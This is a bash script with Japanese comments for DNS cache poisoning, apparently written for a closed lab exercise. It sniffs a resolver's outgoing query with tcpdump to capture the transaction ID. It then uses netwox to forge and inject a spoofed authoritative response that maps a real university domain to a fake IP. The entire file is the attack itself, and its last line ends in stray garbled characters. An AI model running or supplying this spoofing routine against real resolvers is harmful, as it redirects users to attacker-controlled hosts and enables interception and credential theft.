#!/bin/bash
# auto_dns_spoof.sh
# DNSキャッシュ汚染実験用（TXID自動取得版）
# Ubuntu 22.04 + netwox 環境対応
# 閉じたラボ環境専用

# ==== 設定 ====
CACHE_DNS="192.168.56.102"   # キャッシュDNSサーバ
AUTH_DNS="192.168.56.103"    # 権威DNSサーバ（偽装送信元IP）
FAKE_IP="192.168.56.104"     # 偽Aレコード
DOMAIN="www.kochi-ct.ac.jp"  # 攻撃対象ドメイン
TTL="300"                     # キャッシュTTL
TMP_BIN="/tmp/dns_response.bin"

# ==== TXID取得 ====
echo "[*] キャッシュサーバからのDNS問い合わせを監視中..."
echo "[*] tcpdumpで1件のDNS問い合わせをキャプチャします..."

# tcpdumpでDNSパケットを1件キャプチャし、最初の2バイト(トランザクションID)を取得
TXID=$(sudo tcpdump -n -i any -c 1 "udp and src $CACHE_DNS and dst port 53" -vv -XX \
  | grep -A1 "0x0000:" \
  | tail -n1 \
  | awk '{print "0x"$1$2}')

if [ -z "$TXID" ]; then
    echo "[!] TXIDを取得できませんでした"
    exit 1
fi

echo "[*] 取得したTXID: $TXID"

# ==== DNSレスポンス作成 ====
echo "[*] DNSレスポンスパケットを作成中..."
sudo netwox 28 \
  -t 1 \
  -d $DOMAIN \
  -i $TXID \
  -r $FAKE_IP \
  -a $TTL \
  -f 1 > $TMP_BIN

if [ $? -ne 0 ]; then
    echo "[!] DNSレスポンス作成に失敗しました"
    exit 1
fi

# ==== 偽応答送信 ====
echo "[*] 偽DNS応答をキャッシュサーバに送信..."
sudo netwox 105 \
  -d $CACHE_DNS \
  -D 53 \
  -s $AUTH_DNS \
  -S 53 \
  -u @$TMP_BIN

if [ $? -ne 0 ]; then
    echo "[!] 偽応答送信に失敗しました"
    exit 1
fi

echo "[*] 偽応答送信完了。キャッシュサーバのキャッシュを確認してください。*]()
